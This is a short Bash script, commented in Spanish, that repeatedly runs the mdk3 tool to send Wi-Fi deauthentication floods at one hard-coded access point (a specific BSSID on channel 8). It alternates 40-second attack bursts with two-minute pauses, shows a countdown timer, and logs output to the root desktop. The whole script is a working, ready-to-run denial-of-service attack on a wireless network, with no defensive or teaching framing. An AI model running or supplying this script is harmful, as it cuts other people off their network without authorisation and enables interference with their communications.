#!/bin/bash
tiempo_ejecucion=('40s');
tiempo_dormir=("2m");
#

####INICIO CODE CRONOMETRO###
#!/bin/bash
function INIT_CRONOMETRO(){
	in_prom=("$@");
	tmp_sumado=0;
	for (( i=0; i<=${#in_prom[@]}; i++))
	do
		tmp_final=${in_prom[$i]};
		tiempo=`echo ${tmp_final//[!0-9]/}`
		case $tmp_final in
			 *h*)
				  tmp_sumado=$((($tiempo*60*60)+$tmp_sumado));
				  ;;
				   *m*)
					    tmp_sumado=$((($tiempo*60)+$tmp_sumado));
					    ;;
					     *s*)
						       tmp_sumado=$(($tmp_sumado+$tiempo))
						       ;;
				       esac
			       done
			       START_CRONOMETRO $tmp_sumado;
		       }

		       function START_CRONOMETRO () {
			       _tmp_fin=$1;
			       rj_inverso=$(($1-1));
			       local hrs mts seg;
			       #i=1;#Contador 1segundo
			       while [ $(($rj_inverso>0)) == 1 ]
			       do
				       hrs=$((rj_inverso/60/60))
				       mts=$((rj_inverso/60%60))
				       seg=$((rj_inverso%60))
				       printf  "\r%02d%s%02d%s%02d%s" $hrs "h" $mts "m" $seg "s"
				       #echo -e -n "\r$hrs""h""$mts""m""$seg""s";
				       #echo -e -n "\r"$rj_inverso" Segundos."
				       sleep 1s;
				       ((rj_inverso=rj_inverso-1))
			       done
		       }
#####END CODE#####
while :
do
	$(mdk3 wlan1mon d 94:02:6B:40:6E:82 -c 8 | tee -a /root/Desktop/mdk3-log.log)& pidsave=$!;
	#Tiempo que procesó se ejecuta
	echo "mdk3 en ejecucion por:  "$tiempo_ejecucion
	#sleep $tiempo_ejecucion;
	INIT_CRONOMETRO $tiempo_ejecucion
	##Matamos poceso en ejecucion
	kill $pidsave 
	echo -e "\nFinalizo.\n"
	sleep 1s; 
	#Tiempo que dormira el proceso, para
	#despues reanudar.
	echo -e "\nmdk3 en espera:" $tiempo_dormir
	INIT_CRONOMETRO $tiempo_dormir
	#sleep $tiempo_dormir;
	echo -e "\nReiniciando: mdk3\n"
done
